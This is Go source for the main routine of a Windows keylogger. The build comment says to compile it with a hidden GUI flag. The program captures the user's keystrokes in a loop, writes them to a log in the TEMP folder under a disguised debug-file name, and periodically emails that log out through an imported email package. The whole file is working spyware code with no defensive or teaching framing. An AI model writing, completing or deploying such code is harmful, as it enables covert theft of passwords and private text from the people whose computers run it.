package main

import (
	"log"
	"os"
	"time"

	"./email"
	"./keylogger"
)

const (
	delayKeyfetchMS = 5
)

var (
	path = os.Getenv("TEMP")
)

//To generate the .exe, follow the following command from the src folder:
//go build -ldflags -H=windowsgui
func main() {
	//A log is created in the user's temporary files
	LOG_FILE := path + "\\aria-debug-2608.log"
	logFile, err := os.OpenFile(LOG_FILE, os.O_CREATE|os.O_APPEND|os.O_RDWR, 0644)
	if err != nil {
		log.Fatalln(err)
	}
	log.SetOutput(logFile)

	//creates a new keylogger
	kl := keylogger.NewKeylogger()
	timer := 0
	var text string

	for {
		//Get the key pressed by the user
		key := kl.GetKey()

		//Check if a key is pressed
		if !key.Empty {
			text += string(key.Rune)
		}

		//A log is printed with the text written so far
		if timer%1000 == 0 {
			log.Println(text)
			text = ""
		}

		//An email is sent with the user's keylogger log
		if timer%2000 == 0 {
			go email.SendEmail()
		}

		timer++

		time.Sleep(delayKeyfetchMS * time.Millisecond)
	}
}
